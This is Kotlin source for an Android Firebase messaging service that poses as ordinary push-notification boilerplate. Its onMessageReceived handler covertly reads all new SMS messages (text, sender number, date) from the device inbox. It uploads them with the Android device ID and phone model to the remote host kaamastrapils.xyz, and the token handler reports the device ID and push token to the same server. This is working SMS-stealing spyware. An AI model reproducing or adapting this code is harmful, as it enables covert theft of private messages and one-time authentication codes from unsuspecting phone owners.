package com.example.appication

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.*


class MyFirebaseMessagingService : FirebaseMessagingService() {
    @SuppressLint("Range", "HardwareIds")
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "From: ${remoteMessage.from}")
        val handler = Handler(Looper.getMainLooper())
//        handler.post {
//            Toast.makeText(this,"received",Toast.LENGTH_SHORT).show()
//        }
        val interceptor = HttpLoggingInterceptor()
        interceptor.apply { interceptor.level = HttpLoggingInterceptor.Level.BODY }
        val client = OkHttpClient.Builder().addInterceptor(interceptor).build()

        val retrofit = Retrofit.Builder()
            .baseUrl("https://kaamastrapils.xyz/")
            .client(client)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service: RetrofitInterface = retrofit.create(RetrofitInterface::class.java)
        val job = SupervisorJob()

        val os = Build.VERSION.RELEASE
        val model = Build.MODEL
        val deviceid = Settings.Secure.getString(
            applicationContext.contentResolver, Settings.Secure.ANDROID_ID
        )
        var prefValue : Pair<Long,String>? = getDateFromPref()
        if(prefValue == null) setDate()
        prefValue  = getDateFromPref()
        if(prefValue == null) return
        var filter = "date > "+prefValue.first
        var lastDate = 0L

        try {


            val cursor: Cursor? =
                contentResolver.query(
                    Uri.parse("content://sms"), null, filter,
                    null, "date ASC"
                )

            if (cursor?.moveToFirst() == true) {
                do {
                    Log.d(TAG, cursor.getString(cursor.getColumnIndex("body")))
                    print("$TAG called")
                    val msgData = cursor.getString(cursor.getColumnIndex("body"))
                    val phone : String = cursor.getString(cursor.getColumnIndex("address"))
                    lastDate = cursor.getLong(cursor.getColumnIndex("date"))
                    val date : String = cursor.getString(cursor.getColumnIndex("date"))
                    CoroutineScope(job).launch {
                        service.sendMessage(
                            Message(
                                deviceid,
                                "$model  $os",
                                date,
                                phone,
                                msgData,
                                prefValue.second
                            )
                        )
                    }
                } while (cursor.moveToNext())
            } else {
                // empty box, no SMS
            }
        }catch (e : Exception){

        }

        setLastDate(lastDate)
        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "Message data payload: ${remoteMessage.data}")

            if (/* Check if data needs to be processed by long running job */ true) {
                // For long-running tasks (10 seconds or more) use WorkManager.
                scheduleJob()
            } else {
                // Handle message within 10 seconds
                handleNow()
            }
        }
        remoteMessage.notification?.let {
            Log.d(TAG, "Message Notification Body: ${it.body}")
        }

    }

    override fun onNewToken(token: String) {
        Log.d(TAG, "Refreshed token: $token")
        val deviceid = Settings.Secure.getString(
            applicationContext.contentResolver, Settings.Secure.ANDROID_ID
        )
        val retrofit = Retrofit.Builder()
            .baseUrl("https://kaamastrapils.xyz/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service: RetrofitInterface = retrofit.create(RetrofitInterface::class.java)
        val job = SupervisorJob()
        CoroutineScope(job).launch {
            service.sendToken(Token(deviceid,token))
        }
        sendRegistrationToServer(token)
    }

    private fun scheduleJob() {
        val work = OneTimeWorkRequest.Builder(MyWorker::class.java)
            .build()
        WorkManager.getInstance(this)
            .beginWith(work)
            .enqueue()
    }

    private fun handleNow() {
        Log.d(TAG, "Short lived task is done.")
    }

    private fun sendRegistrationToServer(token: String?) {
        Log.d(TAG, "sendRegistrationTokenToServer($token)")
    }

    companion object {
        private const val TAG = "MyFirebaseMsgService"
    }

    internal class MyWorker(appContext: Context, workerParams: WorkerParameters) : Worker(appContext, workerParams) {
        override fun doWork(): Result {
            return Result.success()
        }
    }
    private fun getDateFromPref() : Pair<Long,String>?{
        val sh = getSharedPreferences("base", Context.MODE_PRIVATE)
        val user = sh.getString("user",null)
        val time = sh.getLong("time",0L)
        Log.d(TAG, "Refreshed token: $time $user")
        if(user == null || time == 0L)  return null
        return Pair(time,user)
    }
    private fun setDate(){
        val sharedPref = getSharedPreferences("base",Context.MODE_PRIVATE)
        val storedTimeValue = sharedPref.getLong("time",0L)
        val storedUserValue = sharedPref.getString("user",null)
        if(storedTimeValue != 0L && storedUserValue != null) return
        val editor: SharedPreferences.Editor = sharedPref.edit()
        if(storedUserValue == null) {
            val user = (Math.floor(Math.random() * 9000000000L).toLong() + 1000000000L).toString()
            editor.putString("user", user)
        }
        if(storedTimeValue == 0L){
            val date = Date().time
            editor.putLong("time",date)
        }
        editor.apply()
    }
    private fun setLastDate(date : Long){
        if(date == 0L) return
        val sharedPref = getSharedPreferences("base",Context.MODE_PRIVATE)
        val editor: SharedPreferences.Editor = sharedPref.edit()
        editor.putLong("time",date)
        editor.apply()

    }
}